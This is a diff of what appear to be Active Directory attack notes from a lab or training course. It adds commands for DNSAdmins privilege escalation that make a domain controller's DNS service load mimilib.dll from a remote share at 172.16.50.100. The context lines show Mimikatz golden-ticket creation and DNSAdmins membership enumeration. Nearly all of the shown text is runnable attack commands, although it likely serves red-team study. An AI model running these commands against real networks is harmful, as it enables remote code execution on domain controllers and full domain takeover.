@@ -703,3 +703,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - `Get-ADGroupMember -Identity DNSAdmins`
 
 - Once we know the members of the DNSAdmins group, we need to compromise a member. We already have hash of srvadmin because of derivative local admin.
+
+- From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS)
+- `dnscmd dcorp-dc /config /serverlevelplugindl \\172.16.50.100\dll\mimilib.dll`
+
+- Using DNSServer module (needs RSAT DNS)
+- `$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All`
+- `$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"`
+- `Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose`
